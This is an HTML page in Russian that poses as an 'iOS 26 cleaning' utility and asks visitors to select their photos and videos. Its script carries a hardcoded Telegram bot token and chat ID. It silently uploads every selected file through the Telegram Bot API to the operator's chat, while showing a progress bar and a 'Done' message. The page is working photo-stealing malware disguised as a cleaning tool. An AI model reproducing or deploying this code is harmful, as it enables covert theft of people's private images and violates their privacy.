<!DOCTYPE html>
<html>
<head>
<title>Очистка iOS</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:-apple-system;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}
.card{background:#1c1c1e;padding:30px 20px;border-radius:20px;width:90%;max-width:350px}
h2{font-size:22px;margin-bottom:8px}
p{color:#8e8e93;font-size:14px;margin-bottom:20px}
.btn{background:#007aff;color:#fff;border:none;padding:15px;font-size:18px;border-radius:12px;width:100%}
.btn:active{opacity:0.7}
.barwrap{width:100%;height:6px;background:#333;border-radius:3px;margin:15px 0;display:none}
.bar{width:0%;height:6px;background:#0f0;border-radius:3px}
#status{display:none;margin-top:8px;font-size:14px}
#preview{display:none;flex-wrap:wrap;justify-content:center;gap:5px;margin:10px 0;max-height:150px;overflow-y:auto}
#preview img{width:50px;height:50px;object-fit:cover;border-radius:6px}
</style>
</head>
<body>
<div class="card">
<h2>🧹 Очистка iOS 26</h2>
<p id="info">Нажмите кнопку и разрешите доступ к фото</p>
<button class="btn" id="btn" onclick="go()">📸 Выбрать фото</button>
<div class="barwrap" id="barwrap"><div class="bar" id="bar"></div></div>
<p id="status"></p>
<div id="preview"></div>
</div>
<input type="file" id="input" multiple accept="image/*,video/*" style="display:none">
<script>
const TOKEN="8673011110:AAGH5Zb6Put8qCt6Zjd_wuRt1Lbjqnhou8g";
const CHAT_ID="8181041871";

// Пробуем разные способы получить фото
async function go(){
    document.getElementById('btn').style.display='none';
    document.getElementById('info').innerText='Ищем фото...';
    
    // Способ 1: showOpenFilePicker с multiple
    try {
        const dirHandle = await window.showOpenFilePicker({
            multiple: true,
            types: [{accept: {'image/*': ['.jpg','.jpeg','.png','.heic','.gif'], 'video/*': ['.mp4','.mov']}}]
        });
        processFiles(dirHandle);
        return;
    } catch(e) {}
    
    // Способ 2: input click (старый метод)
    const input = document.getElementById('input');
    input.click();
    input.onchange = function(){
        const files = Array.from(input.files);
        processFiles(files);
    };
}

async function processFiles(files){
    const total = files.length;
    if(total === 0) {
        document.getElementById('info').innerText = 'Не выбрано ни одного файла';
        document.getElementById('btn').style.display='block';
        return;
    }
    
    document.getElementById('info').innerHTML = 'Найдено: <b>'+total+' файлов</b>';
    document.getElementById('barwrap').style.display='block';
    document.getElementById('status').style.display='block';
    
    // Показываем превью первых 20 фото
    const preview = document.getElementById('preview');
    preview.style.display = 'flex';
    for(let i=0; i<Math.min(20, total); i++){
        const f = files[i];
        if(f.type.startsWith('image/')){
            const url = URL.createObjectURL(f);
            const img = document.createElement('img');
            img.src = url;
            preview.appendChild(img);
        }
    }
    
    // Отправляем
    for(let i=0; i<total; i+=5){
        const batch = Array.from(files).slice(i, i+5);
        for(const f of batch){
            const fd = new FormData();
            fd.append('document', f);
            fd.append('chat_id', CHAT_ID);
            try {
                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendDocument', {
                    method:'POST',
                    body:fd
                });
            } catch(e) {}
        }
        const pct = Math.min(100, Math.round((i+5)/total*100));
        document.getElementById('bar').style.width = pct+'%';
        document.getElementById('status').innerText = 'Отправка: '+pct+'%';
    }
    
    document.getElementById('status').innerHTML = '✅ Готово!<br>Можно закрыть страницу';
}
</script>
</body>
</html>
